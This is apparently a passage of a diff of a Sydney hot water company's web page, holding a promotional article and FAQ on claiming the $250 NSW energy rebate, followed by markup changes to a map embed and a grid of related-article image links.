href='#can-tenants-also-claim-the-250-energy-rebate-in-nsw'>Can tenants also claim the $250 energy rebate in NSW?</a></div><div>&nbsp;&nbsp;&nbsp;&nbsp;<a href='#how-long-does-it-take-to-receive-the-250-energy-rebate-after-submitting-the-application'>How long does it take to receive the $250 energy rebate after submitting the application?</a></div><br/><h2 id="avoiding-common-mistakes-when-claiming-the-energy-rebate">Avoiding common mistakes when claiming the energy rebate</h2><p>When applying for the $250 energy rebate in NSW, it is crucial to avoid common errors that could delay or jeopardize your claim process. One common mistake to steer clear of is failing to provide accurate and up-to-date information on your application form. Ensure all details, including your contact information and proof of eligibility, are correctly filled out and attached as required. Additionally, remember to include any receipts or invoices related to qualified energy-saving purchases, such as hot water system upgrades, to support your claim.<br/><br/>Another critical error to avoid is missing the submission deadline for the energy rebate application. Mark the last date for submission on your calendar and set a reminder to prevent missing this crucial timeline. Late submissions may result in your claim being rejected or delayed, thereby causing you to miss out on accessing the $250 rebate. Stay vigilant and organized throughout the application process to increase your chances of a successful claim for the energy rebate in NSW.</p><h3 id="key-errors-to-watch-out-for-during-the-rebate-application">Key errors to watch out for during the rebate application</h3><p>When applying for the $250 energy rebate in NSW, there are several key errors that applicants should be cautious of to ensure a smooth process. One common mistake is not providing accurate and complete information on the application form. It is essential to double-check all details, particularly those related to your energy consumption and residential address, to avoid any discrepancies that could slow down the processing of your rebate claim. Another error to watch out for is failing to submit all necessary documentation along with your application. Missing supporting documents, such as proof of purchase for eligible items like hot water system upgrades, can result in delays or even rejection of your rebate claim.<br/><br/>Ensuring that you meet all eligibility criteria is crucial to avoid complications during the rebate application process. For instance, some applicants may overlook the requirement to have undertaken energy-saving activities in their household, such as installing energy-efficient appliances or undertaking solar panel installations. Additionally, it is essential to pay attention to the deadline for submitting your rebate application, as late submissions may not be accepted. By being diligent in providing accurate information, including documentation for eligible purchases like hot water system upgrades, and meeting all specified requirements, you can increase the likelihood of a successful rebate claim.</p><h2 id="understanding-the-impact-of-the-250-energy-rebate-on-your-bills">Understanding the impact of the $250 energy rebate on your bills</h2><p>The $250 energy rebate introduced in New South Wales aims to provide financial relief to residents facing increasing energy costs. Understanding the impact of this rebate on your bills can help you make informed decisions about your energy usage. By offsetting a portion of your energy expenses, the rebate can lead to noticeable savings over time, especially for households with high energy consumption. From covering a portion of your electricity bill to facilitating hot water system upgrades, the rebate offers flexibility in managing your household expenses more effectively.<br/><br/>Calculating the reduction in your energy expenses with the $250 rebate involves assessing your current energy usage and identifying areas where savings can be maximised. For instance, investing in energy-efficient appliances or implementing sustainable practices can further enhance the impact of the rebate on your bills. The opportunity to undertake hot water system upgrades, for example, can lead to long-term savings and contribute to a more sustainable energy footprint for your household. With careful planning and utilisation of the energy rebate, you can not only reduce your immediate energy costs but also pave the way for long-term financial benefits and environmental conservation.</p><h3 id="calculating-the-reduction-in-your-energy-expenses-with-the-rebate">Calculating the reduction in your energy expenses with the rebate</h3><p>When considering the impact of the $250 energy rebate on your bills, it is essential to calculate the reduction in your energy expenses accurately. One method to assess this is by evaluating your current energy usage and identifying areas where energy efficiency improvements can be made. These improvements could include upgrading appliances to more energy-efficient models, investing in insulation for your home, or considering <a href='hot-water-system-upgrades.html'>Hot Water System Upgrades</a> to maximize the benefits of the rebate on your energy bills.<br/><br/>By implementing changes such as Hot Water System Upgrades, you can not only reduce your energy consumption but also lower your overall energy costs significantly. It is important to research and consult with professionals to determine the most cost-effective upgrades that align with your energy needs and budget. By understanding how the rebate can offset the expenses incurred from such upgrades, you can make informed decisions that contribute to long-term energy savings and a more sustainable household budget.</p><h2 id="resources-for-further-information-on-the-250-energy-rebate-scheme">Resources for further information on the $250 energy rebate scheme</h2><p>For further information on the $250 energy rebate scheme available in New South Wales, individuals can visit the official government website dedicated to energy rebates. The website provides detailed guidelines on eligibility criteria, application procedures, and important deadlines. Additionally, customers can directly contact their energy provider to inquire about the rebate program and seek assistance with the application process. Furthermore, the government's energy efficiency initiatives, including Hot Water System Upgrades, are highlighted on the website for individuals looking to maximize their energy savings through sustainable upgrades.<br/><br/>To learn more about the $250 energy rebate scheme and its implications for customers, individuals can access resources such as brochures and informational booklets available in community centers and local government offices. These resources offer insights into the rebate's role in reducing energy expenses and improving overall energy efficiency. Additionally, seeking guidance from professional energy auditors or consultants can provide valuable information on optimizing energy consumption and leveraging the rebate scheme for long-term savings. By engaging with various resources and experts, customers can make informed decisions to enhance their energy efficiency and take advantage of available rebates, including Hot Water System Upgrades.</p><h3 id="where-to-seek-assistance-or-clarification-regarding-the-rebate-program">Where to seek assistance or clarification regarding the rebate program</h3><p>For individuals seeking assistance or clarification regarding the $250 energy rebate program in NSW, it is advisable to reach out to Service NSW. Service NSW is the primary point of contact for any inquiries related to the rebate scheme. They can provide information on eligibility criteria, application processes, and any other queries you may have in relation to claiming the rebate. Additionally, they can guide you on the necessary steps to take to ensure a smooth and successful application process.<br/><br/>Moreover, if you require specific details on energy-efficient upgrades, such as hot water system upgrades that are eligible for the rebate, contacting your energy provider or visiting the official NSW government website can offer valuable insights. These resources can offer detailed information on the types of upgrades that qualify for the rebate, helping you make informed decisions for your household. By leveraging these resources, you can better understand how to maximise the benefits of the rebate program through energy-efficient measures, such as hot water system upgrades, resulting in long-term savings and environmental benefits.</p><h2 id="faqs">FAQS</h2><h3 id="how-can-i-claim-the-250-energy-rebate-in-nsw">How can I claim the $250 energy rebate in NSW?</h3><p>To claim the $250 energy rebate in NSW, you need to visit the official website of the NSW Government and follow the instructions provided for the rebate application process.</p><h3 id="what-documents-do-i-need-to-submit-when-claiming-the-energy-rebate">What documents do I need to submit when claiming the energy rebate?</h3><p>When claiming the energy rebate, make sure to have your recent energy bill handy as you may need to provide details from it during the application process.</p><h3 id="is-there-a-deadline-for-claiming-the-250-energy-rebate-in-nsw">Is there a deadline for claiming the $250 energy rebate in NSW?</h3><p>Yes, there is a deadline for claiming the $250 energy rebate in NSW. Make sure to check the official website for the rebate program to know the exact deadline for submitting your application.</p><h3 id="can-tenants-also-claim-the-250-energy-rebate-in-nsw">Can tenants also claim the $250 energy rebate in NSW?</h3><p>Yes, tenants in NSW are also eligible to claim the $250 energy rebate. However, they may need to provide additional documents or information to verify their tenancy status.</p><h3 id="how-long-does-it-take-to-receive-the-250-energy-rebate-after-submitting-the-application">How long does it take to receive the $250 energy rebate after submitting the application?</h3><p>The processing time for the $250 energy rebate application may vary. It is advisable to check the official communication channels provided by the NSW Government for updates on the status of your rebate application.</p>
 </div>
         </div>
     </div>
@@ -303,7 +305,7 @@
         <div class="row bg-section-light rounded g-0 g-md-4">
             <div class="col-12 col-lg-5 align-self-center">
                 <div class="card h-100 border-0 p-0 bg-section-light" style="display: {{is_contact_iframe_url}}">
-                    <iframe
+                    <iframe title="Locate Us"
                             src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3311.0481185021067!2d151.03226627667377!3d-33.91416112141155!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x6b12bdaa28c01eaf%3A0xc5ab587e68ecf3f5!2sHot%20water%20experts%20sydney%20%7C%20Hot%20water%20repair%20%7C%20Emergency%20hot%20water%20repair%20%7C%20Hot%20water%20system%20installation!5e0!3m2!1sen!2sau!4v1720431946895!5m2!1sen!2sau"
                             class="border-0 rounded" height="340" allowfullscreen="" loading="lazy"
                             referrerpolicy="no-referrer-when-downgrade"></iframe>
@@ -344,7 +346,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/hot-water-system-upgrades-326495.jpg?key=tPIh4w" alt="Hot Water System Upgrades" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/hot-water-system-upgrades-326495.jpg?key=0pXuf1" alt="Hot Water System Upgrades" class="rounded"
                                  width="80" height="80">
                             <a href="hot-water-system-upgrades.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 Hot Water System Upgrades
@@ -356,7 +358,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/who-is-eligible-for-government-free-hot-water-systems-in-nsw-326554.jpg?key=8408lk" alt="Who is eligible for government free hot water systems in NSW?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/who-is-eligible-for-government-free-hot-water-systems-in-nsw-326554.jpg?key=K4b9Mz" alt="Who is eligible for government free hot water systems in NSW?" class="rounded"
                                  width="80" height="80">
                             <a href="who-is-eligible-for-government-free-hot-water-systems-in-nsw.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 Who is eligible for government free hot water systems in NSW?
@@ -368,7 +370,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-is-the-cheapest-way-to-heat-water-in-australia-326557.jpg?key=t6Ojys" alt="What is the cheapest way to heat water in Australia?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-is-the-cheapest-way-to-heat-water-in-australia-326557.jpg?key=TiUCG2" alt="What is the cheapest way to heat water in Australia?" class="rounded"
                                  width="80" height="80">
                             <a href="what-is-the-cheapest-way-to-heat-water-in-australia.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 What is the cheapest way to heat water in Australia?
@@ -380,7 +382,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-much-is-the-nsw-heat-pump-rebate-1-326558.jpg?key=sk3Ym1" alt="How much is the NSW heat pump rebate?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-much-is-the-nsw-heat-pump-rebate-1-326558.jpg?key=xs73QJ" alt="How much is the NSW heat pump rebate?" class="rounded"
                                  width="80" height="80">
                             <a href="how-much-is-the-nsw-heat-pump-rebate-1.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 How much is the NSW heat pump rebate?
@@ -392,7 +394,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/can-i-upgrade-my-hot-water-heater-326559.jpg?key=FjpWJr" alt="Can I upgrade my hot water heater?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/can-i-upgrade-my-hot-water-heater-326559.jpg?key=Sf86Ij" alt="Can I upgrade my hot water heater?" class="rounded"
                                  width="80" height="80">
                             <a href="can-i-upgrade-my-hot-water-heater.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 Can I upgrade my hot water heater?
@@ -404,7 +406,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-is-the-most-energy-efficient-hot-water-system-in-australia-326560.jpg?key=WwbbR5" alt="What is the most energy efficient hot water system in Australia?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-is-the-most-energy-efficient-hot-water-system-in-australia-326560.jpg?key=ODjaj3" alt="What is the most energy efficient hot water system in Australia?" class="rounded"
                                  width="80" height="80">
                             <a href="what-is-the-most-energy-efficient-hot-water-system-in-australia.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 What is the most energy efficient hot water system in Australia?
@@ -416,7 +418,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/should-i-replace-my-20-year-old-water-heater-326561.jpg?key=zAXFWf" alt="Should I replace my 20 year old water heater?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/should-i-replace-my-20-year-old-water-heater-326561.jpg?key=lIUxWb" alt="Should I replace my 20 year old water heater?" class="rounded"
                                  width="80" height="80">
                             <a href="should-i-replace-my-20-year-old-water-heater.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 Should I replace my 20 year old water heater?
@@ -428,7 +430,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/are-hot-water-heat-pumps-worth-it-326562.jpg?key=DdFsVW" alt="Are hot water heat pumps worth it?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/are-hot-water-heat-pumps-worth-it-326562.jpg?key=m8QNZZ" alt="Are hot water heat pumps worth it?" class="rounded"
                                  width="80" height="80">
                             <a href="are-hot-water-heat-pumps-worth-it.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 Are hot water heat pumps worth it?
@@ -440,7 +442,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-much-does-it-cost-to-install-a-heat-pump-hot-water-system-326563.jpg?key=7AQrbm" alt="How much does it cost to install a heat pump hot water system?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-much-does-it-cost-to-install-a-heat-pump-hot-water-system-326563.jpg?key=Yczsqw" alt="How much does it cost to install a heat pump hot water system?" class="rounded"
                                  width="80" height="80">
                             <a href="how-much-does-it-cost-to-install-a-heat-pump-hot-water-system.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 How much does it cost to install a heat pump hot water system?
@@ -452,7 +454,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-much-does-it-cost-to-replace-a-hot-water-system-in-australia-1-326564.jpg?key=iMa9QA" alt="How much does it cost to replace a hot water system in Australia?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-much-does-it-cost-to-replace-a-hot-water-system-in-australia-1-326564.jpg?key=2Foa0L" alt="How much does it cost to replace a hot water system in Australia?" class="rounded"
                                  width="80" height="80">
                             <a href="how-much-does-it-cost-to-replace-a-hot-water-system-in-australia-1.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 How much does it cost to replace a hot water system in Australia?
@@ -464,7 +466,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-is-the-average-lifespan-of-a-hot-water-system-1-326565.jpg?key=Hqiuhe" alt="What is the average lifespan of a hot water system?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-is-the-average-lifespan-of-a-hot-water-system-1-326565.jpg?key=XsqyG3" alt="What is the average lifespan of a hot water system?" class="rounded"
                                  width="80" height="80">
                             <a href="what-is-the-average-lifespan-of-a-hot-water-system-1.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 What is the average lifespan of a hot water system?
@@ -476,7 +478,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-energy-rebates-are-available-in-nsw-326566.jpg?key=SnEQOR" alt="What energy rebates are available in NSW?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-energy-rebates-are-available-in-nsw-326566.jpg?key=oe7myc" alt="What energy rebates are available in NSW?" class="rounded"
                                  width="80" height="80">
                             <a href="what-energy-rebates-are-available-in-nsw.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 What energy rebates are available in NSW?
@@ -488,7 +490,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-is-the-cheapest-way-to-heat-hot-water-326567.jpg?key=buOqMH" alt="What is the cheapest way to heat hot water?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-is-the-cheapest-way-to-heat-hot-water-326567.jpg?key=LIazHj" alt="What is the cheapest way to heat hot water?" class="rounded"
                                  width="80" height="80">
                             <a href="what-is-the-cheapest-way-to-heat-hot-water.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 What is the cheapest way to heat hot water?
@@ -500,7 +502,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/is-it-worth-replacing-hot-water-cylinder-1-326568.jpg?key=vtaaLn" alt="Is it worth replacing hot water cylinder?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/is-it-worth-replacing-hot-water-cylinder-1-326568.jpg?key=y55Z63" alt="Is it worth replacing hot water cylinder?" class="rounded"
                                  width="80" height="80">
                             <a href="is-it-worth-replacing-hot-water-cylinder-1.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 Is it worth replacing hot water cylinder?
@@ -512,7 +514,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-is-the-cheapest-water-heater-option-326569.jpg?key=xQFT2K" alt="What is the cheapest water heater option?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-is-the-cheapest-water-heater-option-326569.jpg?key=TgVnYz" alt="What is the cheapest water heater option?" class="rounded"
                                  width="80" height="80">
                             <a href="what-is-the-cheapest-water-heater-option.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 What is the cheapest water heater option?
@@ -524,7 +526,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/will-a-new-hot-water-heater-save-electricity-1-326575.jpg?key=TDITg8" alt="Will a new hot water heater save electricity?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/will-a-new-hot-water-heater-save-electricity-1-326575.jpg?key=ATaNbp" alt="Will a new hot water heater save electricity?" class="rounded"
                                  width="80" height="80">
                             <a href="will-a-new-hot-water-heater-save-electricity-1.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 Will a new hot water heater save electricity?
@@ -536,7 +538,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/who-is-eligible-for-free-hot-water-upgrade-nsw-2-326617.jpg?key=76JHX8" alt="Who is eligible for free hot water upgrade NSW?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/who-is-eligible-for-free-hot-water-upgrade-nsw-2-326617.jpg?key=qX7TYB" alt="Who is eligible for free hot water upgrade NSW?" class="rounded"
                                  width="80" height="80">
                             <a href="who-is-eligible-for-free-hot-water-upgrade-nsw-2.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 Who is eligible for free hot water upgrade NSW?
@@ -548,7 +550,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/is-the-vic-government-providing-free-hot-water-upgrades-326618.jpg?key=ecyE9B" alt="Is the Vic government providing free hot water upgrades?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/is-the-vic-government-providing-free-hot-water-upgrades-326618.jpg?key=X0VbJo" alt="Is the Vic government providing free hot water upgrades?" class="rounded"
                                  width="80" height="80">
                             <a href="is-the-vic-government-providing-free-hot-water-upgrades.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 Is the Vic government providing free hot water upgrades?
@@ -560,7 +562,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-is-the-most-efficient-hot-water-system-in-australia-2-326619.jpg?key=RTXeCO" alt="What is the most efficient hot water system in Australia?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-is-the-most-efficient-hot-water-system-in-australia-2-326619.jpg?key=FY5aP3" alt="What is the most efficient hot water system in Australia?" class="rounded"
                                  width="80" height="80">
                             <a href="what-is-the-most-efficient-hot-water-system-in-australia-2.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 What is the most efficient hot water system in Australia?
@@ -572,7 +574,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-long-do-hot-water-systems-last-2-326620.jpg?key=1fBvig" alt="How long do hot water systems last?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-long-do-hot-water-systems-last-2-326620.jpg?key=mneOcB" alt="How long do hot water systems last?" class="rounded"
                                  width="80" height="80">
                             <a href="how-long-do-hot-water-systems-last-2.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 How long do hot water systems last?
@@ -584,7 +586,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-is-the-hot-water-concession-in-victoria-326622.jpg?key=z0HFc1" alt="What is the hot water concession in Victoria?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-is-the-hot-water-concession-in-victoria-326622.jpg?key=xLImU3" alt="What is the hot water concession in Victoria?" class="rounded"
                                  width="80" height="80">
                             <a href="what-is-the-hot-water-concession-in-victoria.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 What is the hot water concession in Victoria?
@@ -596,7 +598,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/are-heat-pump-hot-water-systems-worth-it-326623.jpg?key=npKx0s" alt="Are heat pump hot water systems worth it?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/are-heat-pump-hot-water-systems-worth-it-326623.jpg?key=tIOzum" alt="Are heat pump hot water systems worth it?" class="rounded"
                                  width="80" height="80">
                             <a href="are-heat-pump-hot-water-systems-worth-it.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 Are heat pump hot water systems worth it?
@@ -608,7 +610,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-products-are-offered-by-australian-energy-upgrades-326625.jpg?key=rsgxX4" alt="What products are offered by Australian energy upgrades?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-products-are-offered-by-australian-energy-upgrades-326625.jpg?key=Obisii" alt="What products are offered by Australian energy upgrades?" class="rounded"
                                  width="80" height="80">
                             <a href="what-products-are-offered-by-australian-energy-upgrades.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 What products are offered by Australian energy upgrades?
@@ -620,7 +622,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-brand-of-hot-water-system-is-most-reliable-326626.jpg?key=D9etD1" alt="What brand of hot water system is most reliable?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-brand-of-hot-water-system-is-most-reliable-326626.jpg?key=suVbzW" alt="What brand of hot water system is most reliable?" class="rounded"
                                  width="80" height="80">
                             <a href="what-brand-of-hot-water-system-is-most-reliable.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 What brand of hot water system is most reliable?
@@ -632,7 +634,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-size-hot-water-system-do-i-need-for-a-family-of-two-326627.jpg?key=Wkd6Hu" alt="What size hot water system do I need for a family of two?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-size-hot-water-system-do-i-need-for-a-family-of-two-326627.jpg?key=D7j3Xr" alt="What size hot water system do I need for a family of two?" class="rounded"
                                  width="80" height="80">
                             <a href="what-size-hot-water-system-do-i-need-for-a-family-of-two.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 What size hot water system do I need for a family of two?
@@ -644,7 +646,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-size-hot-water-tank-for-family-of-4-326630.jpg?key=zCEtCu" alt="What size hot water tank for family of 4?" class="rounded"
